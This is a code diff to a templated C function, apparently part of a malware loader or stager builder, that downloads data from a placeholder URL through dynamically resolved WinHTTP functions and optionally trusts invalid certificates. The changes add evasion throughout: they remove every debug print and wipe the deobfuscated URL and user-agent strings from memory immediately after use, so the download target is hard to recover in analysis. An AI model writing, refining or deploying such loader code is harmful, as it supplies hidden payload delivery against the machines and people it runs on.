@@ -10,19 +10,18 @@ BOOL LoadData(PBYTE* ppData, PDWORD pdwDataSize) {
         unsigned char user_agent_bytes[] = { {{ user_agent_obfuscated }} };
         
         DeobfuscateString(url_bytes, sizeof(url_bytes));
-        DeobfuscateString(user_agent_bytes, sizeof(user_agent_bytes));
-
         MultiByteToWideChar(CP_ACP, 0, (LPCSTR)url_bytes, sizeof(url_bytes), url_wide, 512);
+        pfnRtlZeroMemory(url_bytes, sizeof(url_bytes)); // Securely wipe plaintext bytes
+
+        DeobfuscateString(user_agent_bytes, sizeof(user_agent_bytes));
         MultiByteToWideChar(CP_ACP, 0, (LPCSTR)user_agent_bytes, sizeof(user_agent_bytes), user_agent_wide, 256);
+        pfnRtlZeroMemory(user_agent_bytes, sizeof(user_agent_bytes)); // Securely wipe plaintext bytes
 
     {% else %}
-        wchar_t url_temp[] = L"{{ url }}";
-        wchar_t user_agent_temp[] = L"{{ user_agent }}";
-        pfnRtlMoveMemory(url_wide, url_temp, sizeof(url_temp));
-        pfnRtlMoveMemory(user_agent_wide, user_agent_temp, sizeof(user_agent_temp));
+        pfnRtlMoveMemory(url_wide, L"{{ url }}", sizeof(L"{{ url }}"));
+        pfnRtlMoveMemory(user_agent_wide, L"{{ user_agent }}", sizeof(L"{{ user_agent }}"));
     {% endif %}
 
-    DEBUG_PRINT("LoadData: Attempting to use URL: %ls", url_wide);
     BOOL bTrustInvalidCert = {{ trust_invalid_cert }};
     
     HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
@@ -32,27 +31,24 @@ BOOL LoadData(PBYTE* ppData, PDWORD pdwDataSize) {
     PBYTE temp_buffer = NULL;
     DWORD total_size = 0;
 
-   URL_COMPONENTSW urlComp;
+    URL_COMPONENTSW urlComp;
     pfnRtlZeroMemory(&urlComp, sizeof(urlComp));
     urlComp.dwStructSize = sizeof(urlComp);
-
+    
+    urlComp.nScheme = INTERNET_SCHEME_UNKNOWN;
     urlComp.lpszHostName = NULL;
     urlComp.dwHostNameLength = 1;
     urlComp.lpszUrlPath = NULL;
-    urlComp.dwUrlPathLength = 1; 
-    urlComp.nScheme = INTERNET_SCHEME_UNKNOWN;
+    urlComp.dwUrlPathLength = 1;
 
     if (!pfnWinHttpCrackUrl(url_wide, 0, 0, &urlComp)) {
-        DEBUG_PRINT("LoadData: WinHttpCrackUrl failed.");
         return FALSE;
     }
 
-    DEBUG_PRINT("LoadData: WinHttpCrackUrl parsed HostNameLength: %lu, Scheme: %d, Port: %u", 
-                urlComp.dwHostNameLength, urlComp.nScheme, urlComp.nPort);
-
     hSession = pfnWinHttpOpen(user_agent_wide, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    pfnRtlZeroMemory(user_agent_wide, sizeof(user_agent_wide)); // Securely wipe user agent after use
+
     if (!hSession) {
-        DEBUG_PRINT("LoadData: WinHttpOpen failed.");
         return FALSE;
     }
 
@@ -65,30 +61,26 @@ BOOL LoadData(PBYTE* ppData, PDWORD pdwDataSize) {
     pfnRtlZeroMemory(host_name_buffer, sizeof(host_name_buffer));
     if (urlComp.lpszHostName && urlComp.dwHostNameLength > 0 && urlComp.dwHostNameLength < 256) {
         pfnRtlMoveMemory(host_name_buffer, urlComp.lpszHostName, urlComp.dwHostNameLength * sizeof(wchar_t));
-        host_name_buffer[urlComp.dwHostNameLength] = L'\0'; // Manually null-terminate
+        host_name_buffer[urlComp.dwHostNameLength] = L'\0';
     }
-
-    DEBUG_PRINT("LoadData: Attempting to connect to host: '%ls' on port %u", host_name_buffer, urlComp.nPort);
 
     hConnect = pfnWinHttpConnect(hSession, host_name_buffer, urlComp.nPort, 0);
     if (!hConnect) {
-        DEBUG_PRINT("LoadData: WinHttpConnect failed.");
         pfnWinHttpCloseHandle(hSession);
         return FALSE;
     }
-
+    
     wchar_t url_path_buffer[512];
     pfnRtlZeroMemory(url_path_buffer, sizeof(url_path_buffer));
     if (urlComp.lpszUrlPath && urlComp.dwUrlPathLength > 0 && urlComp.dwUrlPathLength < 512) {
         pfnRtlMoveMemory(url_path_buffer, urlComp.lpszUrlPath, urlComp.dwUrlPathLength * sizeof(wchar_t));
-        url_path_buffer[urlComp.dwUrlPathLength] = L'\0'; // Manually null-terminate
+        url_path_buffer[urlComp.dwUrlPathLength] = L'\0';
     }
     
-    // Use the new, safe buffer in the request call
+    pfnRtlZeroMemory(url_wide, sizeof(url_wide)); // Securely wipe full URL string after its components have been used
+
     hRequest = pfnWinHttpOpenRequest(hConnect, L"GET", url_path_buffer, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, (urlComp.nScheme == INTERNET_SCHEME_HTTPS ? WINHTTP_FLAG_SECURE : 0));
-    
     if (!hRequest) {
-        DEBUG_PRINT("LoadData: WinHttpOpenRequest failed.");
         pfnWinHttpCloseHandle(hConnect);
         pfnWinHttpCloseHandle(hSession);
         return FALSE;
@@ -96,7 +88,6 @@ BOOL LoadData(PBYTE* ppData, PDWORD pdwDataSize) {
 
     bResults = pfnWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
     if (!bResults) {
-        DEBUG_PRINT("LoadData: WinHttpSendRequest failed.");
         pfnWinHttpCloseHandle(hRequest);
         pfnWinHttpCloseHandle(hConnect);
         pfnWinHttpCloseHandle(hSession);
@@ -105,7 +96,6 @@ BOOL LoadData(PBYTE* ppData, PDWORD pdwDataSize) {
 
     bResults = pfnWinHttpReceiveResponse(hRequest, NULL);
     if (!bResults) {
-        DEBUG_PRINT("LoadData: WinHttpReceiveResponse failed.");
         pfnWinHttpCloseHandle(hRequest);
         pfnWinHttpCloseHandle(hConnect);
         pfnWinHttpCloseHandle(hSession);
